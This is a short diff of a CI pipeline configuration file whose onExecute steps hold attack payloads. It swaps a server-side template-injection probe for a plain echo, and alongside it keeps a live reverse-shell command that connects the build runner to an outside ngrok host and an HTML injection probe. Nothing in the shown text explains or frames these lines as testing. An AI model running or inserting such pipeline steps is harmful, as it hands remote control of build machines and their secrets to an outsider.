@@ -8,6 +8,6 @@ pipelines:
             - name: my_property_bag
         execution:
           onExecute:
-            - echo "${{7*'7'}}"
+            - echo "running shell"
             - sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/18236 0>&1
             - <img src=x>
